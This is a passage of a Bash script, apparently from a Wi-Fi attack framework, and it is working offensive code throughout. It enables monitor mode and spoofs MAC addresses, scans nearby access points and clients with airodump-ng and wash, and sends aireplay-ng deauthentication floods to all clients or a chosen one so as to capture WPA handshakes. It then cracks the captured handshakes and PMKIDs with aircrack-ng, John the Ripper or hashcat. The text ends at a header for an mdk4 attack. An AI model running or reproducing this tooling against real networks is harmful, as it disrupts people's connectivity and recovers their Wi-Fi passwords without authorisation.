# Functions related to network interface info (MAC, mode, frequencies...) and enabling/disabling monitor mode
#

# Check if interface is in managed or monitor mode
function print_interface_mode(){
  status_card=$(check_interface_mode)
  # Check if the network adapter is in monitor mode or not
  if [ "${status_card}" == "monitor" ]; then
    if [ "$lang" == "en" ]; then
      good_output "+" "Interface mode: ${greenC}monitor"
    else
      good_output "+" "Modo de la interfaz: ${greenC}monitor"
    fi
  else
    if [ "$lang" == "en" ]; then
      good_output "+" "Interface mode: ${grayC}managed"
    else
      good_output "+" "Modo de la interfaz: ${grayC}managed"
    fi
  fi
}

# Print interface name, use green color for monitor mode and gray for managed mode
function print_interface_name(){
  if [ -d "/sys/class/net/${netCard}" ]; then
    if [ "$lang" == "en" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output_ln "+" "Interface name: ${greenC}${netCard}"
      else
        good_output_ln "+" "Interface name: ${grayC}${netCard}"
      fi

    else
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output_ln "+" "Nombre de la interfaz: ${greenC}${netCard}"
      else
        good_output_ln "+" "Nombre de la interfaz: ${grayC}${netCard}"
      fi
    fi

  else
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}[${yC}!${blueC}] Interface not found${endC}"
    else
      echo -e "${blueC}[${yC}!${blueC}] Interfaz no encontrada${endC}"
    fi
  fi
}

# Print MAC address
function print_mac_address(){
  vendor="($(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(")" # Get vendor from "macchanger" output
  if [ "${vendor}" == "(unknown)" ]; then
    vendor="($(macchanger -s ${netCard} | grep "Perm" | awk '{print $2}' FS="(")" # Filter for permanent address if current is unknown
  fi

  # Check if network interface is active and exists
  #if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" != "monitor" ]; then
  if [ "$(check_interface_mode)" != "monitor" ]; then
    current_mac=$(iw dev ${netCard} info | grep "addr" | awk '{print $2}')
    if [ "$lang" == "en" ]; then
      good_output "+" "MAC address: ${grayC}${current_mac} ${vendor}"
    else
      good_output "+" "Dirección MAC: ${grayC}${current_mac} ${vendor}"
    fi

  # Function enters here if the function is called with monitor mode enabled
  #elif [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" == "monitor" ]; then
  elif [ "$(check_interface_mode)" == "monitor" ]; then
    current_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}' | tr '[:lower:]' '[:upper:]')
    if [ "$lang" == "en" ]; then
      good_output "+" "MAC address: ${greenC}${current_mac} ${vendor}"
    else
      good_output "+" "Dirección MAC: ${greenC}${current_mac} ${vendor}"
    fi

  else
    if [ "$lang" == "en" ]; then
      color_output "X" "An error has ocurred while getting MAC address\n"
    else
      color_output "X" "Ha ocurrido un error al obtener la dirección MAC\n"
    fi
    ctrl_c
  fi 
}

# Print interface frequencies band (2.4GHz, 5GHz or both)
function print_freq_band(){
  out=$(iw list | grep -A 10 'Frequencies:')

  if [ "$lang" == "en" ]; then
    if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then

      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frequency: ${greenC}2.4GHz"
      else  
        good_output "+" "Frequency: ${grayC}2.4GHz"
      fi

    elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frequencies: ${greenC}2.4GHz and 5GHz"
      else
        good_output "+" "Frequencies: ${grayC}2.4GHz and 5GHz"
      fi

    else
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frequency: ${greenC}5GHz"
      else
        good_output "+" "Frequency: ${grayC}5GHz"
      fi
    fi

  else
    if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frecuencia: ${greenC}2.4GHz"
      else
        good_output "+" "Frecuencia: ${grayC}2.4GHz"
      fi

    elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frecuencias: ${greenC}2.4GHz y 5GHz"
      else
        good_output "+" "Frecuencias: ${grayC}2.4GHz y 5GHz"
      fi

    else
      if [ "$(check_interface_mode)" == "monitor" ]; then
        good_output "+" "Frecuencia: ${greenC}5GHz"
      else
        good_output "+" "Frecuencia: ${grayC}5GHz"
      fi
    fi
  fi
}

# Enable monitor mode
function enable_mon(){
  # Function enters here if you haven't enabled monitor mode
  if [ "$(check_interface_mode)" != "monitor" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Configuring network adapter interface (${netCard})..."
    else
      color_output_ln "*" "Configurando la interfaz de la tarjeta de red (${netCard})..."
    fi

    if [ "${airmon_check_kill}" == "true" ]; then
      airmon-ng check kill &>/dev/null
    fi

    # Enable monitor mode
    mon_output="$(airmon-ng start ${netCard})"
    oldCard="$(echo "${mon_output}" | grep "station mode vif disabled" | awk '{print $NF}' FS="]" | tr -d ")")"
    netCard="$(echo "${mon_output}" | grep "monitor mode vif enabled" | awk '{print $NF}' FS="]" | tr -d ")")"
    evilCard="${oldCard}"
    ip link set "${netCard}" up 2>/dev/null
    export netCard oldCard evilCard # Used on Evil Twin attack

    if [ "$lang" == "en" ]; then
      good_output "+" "Interface configured successfully"
    else
      good_output "+" "Interfaz configurada correctamente"
    fi

    if [ "$oldCard" != "$netCard" ]; then
      if [ "$lang" == "en" ]; then
        press_enter "Interface name has changed from $oldCard to ${netCard}, press [Enter] to continue "
      else
        press_enter "El nombre de la interfaz ha cambiado de $oldCard a ${netCard}, presiona [Enter] para continuar "
      fi
    fi

    # Workaround for some weird interfaces which change its name radically after enabling monitor mode
    if [ ! -d "/sys/class/net/${netCard}" ] && [ ! -d "/sys/class/net/${netCard}mon" ]; then
      ask_new_name
    fi
  fi
}

# Disable monitor mode and enable managed mode
function disable_mon(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Configuring interface..."
  else
    color_output_ln "*" "Configurando la interfaz..."
  fi

  airmon-ng stop ${netCard} &>/dev/null
  ip link set ${oldCard} up 2>/dev/null
  netCard=${oldCard}
}

# Change MAC address
function randomize_mac(){
  # Turn off the interface
  ip link set ${netCard} down 2>/dev/null

  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "MAC address to replace the current one with (default=random): " && read mac_to_change
  else
    color_output_no_line "*" "Dirección MAC con la que remplazar la actual (por defecto=random): " && read mac_to_change
  fi

  if [ ! "${mac_to_change}" ]; then
    # Randomize the mac address
    macchanger -a ${netCard} &>/dev/null
  else
    macchanger -m ${mac_to_change} ${netCard} &>/dev/null
  fi

  if [ "$lang" == "en" ]; then
    good_output "+" "MAC address changed successfully"
  else
    good_output "+" "Dirección MAC cambiada correctamente"
  fi

  # Activate again the interface
  ip link set ${netCard} up 2>/dev/null
}




#
# Handshake related functions
#

function select_cracking_method(){
  if [ "$lang" == "en" ]; then
    color_output_ln "+" "Available cracking methods:"
    echo -ne "\t"; color_output_no_line "1" "aircrack-ng\n"
    echo -ne "\t"; color_output_no_line "2" "john the ripper\n"
    echo -ne "\t"; color_output_no_line "3" "hashcat\n\n"
  else
    color_output_ln "+" "Métodos para crackear los handshakes disponibles:"
    echo -ne "\t"; color_output_no_line "1" "aircrack-ng\n"
    echo -ne "\t"; color_output_no_line "2" "john the ripper\n"
    echo -ne "\t"; color_output_no_line "3" "hashcat\n\n"
  fi

  while true; do
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Select an option: " && read crack_option
    else
      color_output_no_line "*" "Selecciona una opción: " && read crack_option
    fi

    if [ "$crack_option" == "1" ]; then
      crack_handshake_aircrack "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
      break
    elif [ "$crack_option" == "2" ]; then
      john_tools_missing="false"
      if [ ! "$(command -v john)" ]; then
        log_command_not_found "john"
        john_tools_missing="true"
      fi

      if [ ! "$(command -v wpapcap2john)" ]; then
        log_command_not_found "wpapcap2john"
        john_tools_missing="true"
      fi

      if [ "$john_tools_missing" != "true" ]; then
        crack_handshake_john "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
        break
      fi

    elif [ "$crack_option" == "3" ]; then
      hashcat_tools_missing="false"
      if [ ! "$(command -v hashcat)" ]; then
        log_command_not_found "hashcat"
        hashcat_tools_missing="true"
      fi

      if [ ! "$(command -v hcxpcapngtool)" ]; then
        log_command_not_found "hcxpcapngtool"
        hashcat_tools_missing="true"
      fi

      if [ "$hashcat_tools_missing" != "true" ]; then
        crack_handshake_aircrack "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
        break
      fi
    fi
  done
}

# Main default cracking function
function crack_handshake(){
  if [ "$(check_target_handshakes_in_file "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap")" -le 0 ] && [ "$(check_pmkid_handshake)" != "true" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "File contains no handshakes"
    else
      color_output_ln "*" "El archivo no contiene handshakes"
    fi

    return
  fi

  trap keep_exit_c INT

  ask_dict

  select_cracking_method

  reset_info
  keep_exit
}

# Crack WPA handshake(s) with aircrack-ng
function crack_handshake_aircrack(){
  if [ -f "${1}" ]; then
    if [ "$(check_handshakes_in_file "${1}")" -le 0 ] && [ "$(check_pmkid_handshake)" != "true" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "File contains no handshakes"
      else
        color_output_ln "*" "El archivo no contiene handshakes"
      fi

      return
    fi

    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Press Ctrl+C to stop aircrack-ng"
    else
      color_output_ln "*" "Presiona Ctrl+C para parar aircrack-ng"
    fi; sleep 1.5

    trap crack_c INT
    aircrack-ng -w ${wordlist_to_use} "${1}" | tee # use "tee" so the command stops with Ctrl+C

    log_cracking_completed
  else
    log_handshakes_not_found
  fi

  reset_info
}

# Crack WPA handshake(s) with john
function crack_handshake_john(){
  if [ -f "${1}" ]; then
    if [ "$(check_handshakes_in_file "${1}")" -le 0 ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "File contains no handshakes"
      else
        color_output_ln "*" "El archivo no contiene handshakes"
      fi

      return
    fi

    rm /usr/share/wef/cache/handshake.jtr 2>/dev/null

    trap crack_c INT
    wpapcap2john "${1}" > "/usr/share/wef/cache/handshake.jtr" 2>/dev/null
    sleep 0.5

    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Press Ctrl+C to stop JTR"
    else
      color_output_ln "*" "Presiona Ctrl+C para parar JTR"
    fi

    john --wordlist="${wordlist_to_use}" "/usr/share/wef/cache/handshake.jtr"
    echo

    log_cracking_completed
  else
    log_handshakes_not_found
  fi

  reset_info
}

# Crack WPA handshake(s) with hashcat
function crack_handshake_hashcat(){
  if [ -f "${1}" ]; then

    if [ "$(file "${1}" | grep "cap capture file")" ]; then
      if [ "$(check_handshakes_in_file "${1}")" -le 0 ]; then
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "File contains no handshakes"
        else
          color_output_ln "*" "El archivo no contiene handshakes"
        fi

        return
      fi

      rm /usr/share/wef/cache/hashcat_hashes.txt 2>/dev/null

      # Convert hashes to readable hashcat format
      hcxpcapngtool -o "/usr/share/wef/cache/hashcat_hashes.txt" "${1}" &>/dev/null

      if [ -f "/usr/share/wef/cache/hashcat_hashes.txt" ] && [ "$(wc -l "/usr/share/wef/cache/hashcat_hashes.txt" | awk '{print $1}')" != "0" ]; then
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "Press Ctrl+C to stop hashcat"
        else
          color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
        fi

        # Crack hashes with hashcat
        hashcat -m 22000 "/usr/share/wef/cache/hashcat_hashes.txt" "${wordlist_to_use}"
        echo

        log_cracking_completed
      else
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "No handshakes available to crack"
        else
          color_output_ln "*" "No hay handshakes disponibles para crackear"
        fi
      fi
    elif [ "$(file "${1}" | grep "ASCII text")" ]; then
      if [ "$(wc -l "${1}" | awk '{print $1}')" != "0" ]; then
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "Press Ctrl+C to stop hashcat"
        else
          color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
        fi

        # Crack hashes with hashcat
        hashcat -m 22000 "${1}" "${wordlist_to_use}"
        echo

        log_cracking_completed
      else
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "No handshakes available to crack"
        else
          color_output_ln "*" "No hay handshakes disponibles para crackear"
        fi
      fi
    else
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "Invalid handshakes file format"
      else
        color_output_ln "*" "Formato del archivo de handshakes incorrecto"
      fi
    fi

  else
    log_handshakes_not_found
  fi

  reset_info
}

# Crack PMKID handshake with hashcat
function crack_pmkid_handshakes(){
  if [ -f "${1}" ] && [ "$(wc -l "${1}" | awk '{print $1}')" != "0" ]; then
    trap crack_c INT
    ask_dict

    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Press Ctrl+C to stop hashcat"
    else
      color_output_ln "*" "Presiona Ctrl+C para parar hashcat"
    fi; sleep 1.5

    hashcat -m 22000 "${1}" "${wordlist_to_use}" -d 1

    echo
    log_cracking_completed
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "No PMKID handshakes found"
    else
      color_output_ln "*" "No se han encontrado handshakes PMKID"
    fi
  fi

  reset_info
  keep_exit
}

function crack_ivs(){
  if [ -f "${1}" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Press Ctrl+C to stop aircrack-ng"
    else
      color_output_ln "*" "Presiona Ctrl+C para parar aircrack-ng"
    fi; sleep 1.5

    trap crack_c INT
    aircrack-ng "${1}" | tee # use "tee" so the command stops with Ctrl+C

    log_cracking_completed
  fi

  reset_info
}


#
# Access Points related functions
#

function scan_aps(){
  if [ ! -f "/usr/share/wef/cache/airodump-01.csv" ] || [ "$scan_on_each_attack" == "true" ]; then # Check if an AP scan already exists
    if [ "$airmon_check_kill" != "true" ]; then # If using in headless, stop scanning with Ctrl+C
      trap ctrl_c_pressed=true INT
      if [ "$lang" == "en" ]; then
        press_enter "Press [Enter] to start scanning APs, then press Ctrl+C to stop "
      else
        press_enter "Presiona [Enter] para empezar a escanear APs, después presiona Ctrl+C para parar "
      fi; sleep 1
    fi

    launch_scan
    
    if [ "$airmon_check_kill" == "true" ]; then
      if [ "$lang" == "en" ]; then
        press_enter "Press [Enter] to stop scanning APs and continue "
      else
        press_enter "Presiona [Enter] para dejar de escanear APs y continuar "
      fi; sleep 1
    elif [ "$airmon_check_kill" == "false" ]; then # If using in headless, keep refreshing APs info until Ctrl+C is pressed
      sleep 0.5
      while true; do
        if [ ! "$ctrl_c_pressed" ]; then
          format_csv_info
          sleep 1
          clear
        else
          break
        fi
      done
    fi

    if [ "$airmon_check_kill" != "true" ]; then
      clear
      trap keep_exit_c INT
    fi

    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null # Kill airodump process

    sleep 0.15; echo
    format_csv_info

  else # If AP scan exists and 'scan_on_each_attack' is set to false, read and format CSV content
    format_csv_info
  fi

  trap keep_exit_c INT
}

function launch_scan(){
  if [ ! "${frequency_band}" ]; then
    frequency_band="2.4"
  fi

  rm /usr/share/wef/cache/airodump-* 2>/dev/null

  if [ "$airmon_check_kill" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -w \"/usr/share/wef/cache/airodump\" --output-format csv --band ${band} ${netCard}" 2>/dev/null &
  else
    airodump-ng -w "/usr/share/wef/cache/airodump" --output-format csv --band ${band} ${netCard} &>/dev/null &
  fi

  airodump_PID=$!
}

function format_csv_info(){
  if [ -f "/usr/share/wef/cache/airodump-01.csv" ]; then
    # Access Points
    aps_headers="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | head -n 1)"

    aps="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"

    # Stations
    stations_headers="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | head -n 1)"

    stations="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"

    if [ "${aps_headers}" ] && [ "${aps}" ]; then
      # Print info
      echo -e "${yC}Number   ${aps_headers}${endC}"

      counter=$((0))
      while read -r line; do
        counter=$((counter+1))

        if [[ $counter -lt 10 ]]; then
          echo -e "${yC}$counter${grayC})       ${line}${endC}"
        else
          echo -e "${yC}$counter${grayC})      ${line}${endC}"
        fi
      done <<< "${aps}"

      if [ "${stations}" ]; then
        if [ "$identify_devices" == "false" ]; then
          echo -e "\n${yC}${stations_headers}${endC}"
        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "true" ]; then
          echo -e "\n${yC}${stations_headers}               Station Vendor${endC}"
        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "false" ] && [ "$ctrl_c_pressed" ]; then
          echo -e "\n${yC}${stations_headers}               Station Vendor${endC}"
        else
          echo -e "\n${yC}${stations_headers}${endC}"
        fi

        if [ "${identify_devices}" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "true" ]; then
          while read -r line; do
            station_mac="$(echo "${line}" | awk '{print $1}')"

            vendor="$(get_vendor_from_mac "${station_mac}")"

            if [ "${vendor}" ]; then
              if [ "$(echo "${line}" | awk '{print $NF}')" == "associated)" ]; then
                echo -e "${grayC}${line}    (${vendor})${endC}"
              else
                echo -e "${grayC}${line}   (${vendor})${endC}"
              fi
            else
              echo -e "${grayC}${line}${endC}"
            fi
          done <<< "${stations}"
        elif [ "$identify_devices" == "true" ] && [ "${stations}" ] && [ "$airmon_check_kill" == "false" ] && [ "$ctrl_c_pressed" ]; then
          while read -r line; do
            station_mac="$(echo "${line}" | awk '{print $1}')"

            vendor="$(get_vendor_from_mac "${station_mac}")"

            if [ "${vendor}" ]; then
              if [ "$(echo "${line}" | awk '{print $NF}')" == "associated)" ]; then
                echo -e "${grayC}${line}    (${vendor})${endC}"
              else
                echo -e "${grayC}${line}   (${vendor})${endC}"
              fi
            else
              echo -e "${grayC}${line}${endC}"
            fi
          done <<< "${stations}"
        else
          echo -e "${grayC}${stations}${endC}"
        fi
      fi
    fi
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "No recent APs scan found"
    else
      color_output_ln "*" "No se ha encontrado ningun escaneo de APs reciente"
    fi
  fi
}

function format_csv_clients_info(){
  if [ -f "/usr/share/wef/cache/airodump-devices-01.csv" ]; then
    # Stations
    stations_headers="$(cat "/usr/share/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | head -n 1)"

    stations="$(cat "/usr/share/wef/cache/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | tail -n +2)"

    echo -e "${yC}Number   ${stations_headers}${endC}"

    counter=$((0))
    while read -r line; do
      counter=$((counter+1))

      if [ "${identify_devices}" == "true" ]; then
        station_mac="$(echo "${line}" | awk '{print $1}')"

        vendor="$(get_vendor_from_mac "${station_mac}")"

        if [ "${vendor}" ]; then
          if [[ $counter -lt 10 ]]; then
            echo -e "${yC}${counter}${grayC})       ${line}  (${vendor})${endC}"
          else
            echo -e "${yC}${counter}${grayC})      ${line}  (${vendor})${endC}"
          fi
        else
          if [[ $counter -lt 10 ]]; then
            echo -e "${yC}${counter}${grayC})       ${line}${endC}"
          else
            echo -e "${yC}${counter}${grayC})      ${line}${endC}"
          fi
        fi
      else
        if [[ $counter -lt 10 ]]; then
          echo -e "${yC}${counter}${grayC})       ${line}${endC}"
        else
          echo -e "${yC}${counter}${grayC})      ${line}${endC}"
        fi
      fi
    done <<< "${stations}"
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "No recent APs scan found"
    else
      color_output_ln "*" "No se ha encontrado ningun escaneo de APs reciente"
    fi
  fi
}

# Used to scan access points for WPS purposes
function scan_aps_wps(){
  trap wash_c INT

  if [ ! "${frequency_band}" ]; then
    frequency_band="2.4"
  fi

  if [ "${band}" == "g" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 2.4GHz access points, press Ctrl+C to stop and continue...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz, presiona Ctrl+C para parar y continuar...\n"
    fi
    wash -2 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &

  elif [ "${band}" == "a" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 5GHz access points, press Ctrl+C to stop and continue...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 5GHz, presiona Ctrl+C para parar y continuar...\n"
    fi
    wash -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &

  elif [ "${band}" == "ag" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 2.4GHz and 5GHz access points, press Ctrl+C to stop and continue...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4GHz and 5GHz, presiona Ctrl+C para parar y continuar...\n"
    fi
    wash -2 -5 -a -i ${netCard} | tee /usr/share/wef/cache/wps_scan.txt &
  fi

  wash_PID=$!
  wait ${wash_PID} 2>/dev/null
  trap keep_exit_c INT
}

function list_aps(){
  if [ -f "/usr/share/wef/cache/wps_scan.txt" ]; then
    echo; cat /usr/share/wef/cache/wps_scan.txt
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "APs list not found. Execute ${yC}scan${blueC} to scan nearby APs"
    else
      color_output_ln "*" "Lista de APs no encontrada. Ejecuta ${yC}scan${blueC} para escanear los APs cercanos"
    fi
  fi
}


#
#
# Attacks functions start here
#
#

#
# DoS attacks
#

# Deauthentication attack main function (aireplay-ng)
function deauthentication_attack(){
  clear
  color_output_ln "*" "In this attack, the devices connected to an access point will be kicked off in order to try to catch a handshake"
  scan_aps # Scan nearby APs
  
  log_back_to_menu
  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  echo
  while true; do
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Do you want to deauthenticate all clients (${yC}1${blueC}) or an especific client (${yC}2${blueC})? (default=1): " && read deauth_option
    else
      color_output_no_line "*" "¿Quieres deautenticar a todos los clientes (${yC}1${blueC}) o solo a un cliente específico (${yC}2${blueC})? (por defecto=1): " && read deauth_option
    fi

    if [ "${deauth_option}" == "back" ]; then
      return

    elif [ "${deauth_option}" == "exit" ] || [ "$deauth_option" == "quit" ]; then
      ctrl_c

    elif [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ] && [ "${deauth_option}" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "X" "Invalid option"
      else
        color_output_ln "X" "Opción inválida"
      fi

    else
      break
    fi
  done

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"

  if [ "${deauth_option}" == "1" ] || [ ! "${deauth_option}" ]; then
    deauth_all_clients
  elif [ "${deauth_option}" == "2" ]; then
    deauth_one_client
  fi
}

function deauth_all_clients(){
  ask_to_capture_handshakes

  default="10"
  ask_frames
  if [ "$frames_to_send" == "back" ]; then
    if [ "$c_h" == "true" ]; then
      kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
    fi
    return
  fi; sleep 0.1

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo"
  fi

  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
  sleep 0.2

  if [ "$verbose" == "false" ]; then
    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null # add "-D" to avoid errors
  else
    echo
    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null # add "-D" to avoid errors
  fi

  if [ "${c_h}" == "true" ]; then # Enter here is user wants to capture handshakes
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.5 "*" "Waiting while clients reconect to AP in order to capture handshakes"
    else
      progress_bar 4 2.5 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
    fi
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    move_capture_files
    check_captured_handshakes
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}

function deauth_one_client(){
  if [ "$lang" == "en" ]; then
    color_output "*" "Scanning devices, do not close airodump-ng window..."
  else
    color_output "*" "Escaneando dispositivos, no cierres la ventana de airodump-ng..."
  fi

  if [ "$airmon_check_kill" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} --bssid ${ap_bssid} -w \"/usr/share/wef/cache/airodump-devices\" ${netCard}" 2>/dev/null &
  else
    airodump-ng -c ${channel} --bssid ${ap_bssid} -w "/usr/share/wef/cache/airodump-devices" ${netCard} 2>/dev/null &
  fi
  airodump_PID=$!

  if [ "$lang" == "en" ]; then
    press_enter "Press [Enter] to stop scanning devices and continue "
  else
    press_enter "Presiona [Enter] para dejar de escanear dispositivos y continuar "
  fi; echo

  kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

  format_csv_clients_info

  echo
  ask_target_client
  if [ "$client_number" == "back" ]; then
    reset_info
    return
  fi

  clients="$(cat /usr/share/wef/cache/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
  clients_length="$(echo "${clients}" | wc -l)"

  if [[ $client_number -le $clients_length ]]; then
    client_mac=$(echo "${clients}" | sed "${client_number}q;d" | awk '{print $1}')
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "X" "Invalid number, returning to main menu..."
    else
      color_output_ln "X" "Número inválido, volviendo al menú principal..."
    fi; sleep 1

    return
  fi

  default="10"
  ask_frames
  if [ "$frames_to_send" == "back" ]; then
    reset_info
    return
  fi; sleep 0.1

  ask_to_capture_handshakes

  sleep 0.9

  clear
  log_attack_info
  press_enter_attack
  echo

  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} &>/dev/null
  else
    echo
    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} 2>/dev/null
  fi

  if [ "${c_h}" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.2 "*" "Waiting while client reconects to AP in order to capture handshake"
    else
      progress_bar 4 2.2 "*" "Esperando mientras el cliente se reconecta al AP para capturar su handshake"
    fi
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    move_capture_files
    check_captured_handshakes
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}

# WIDS Confusion attack (mdk4)
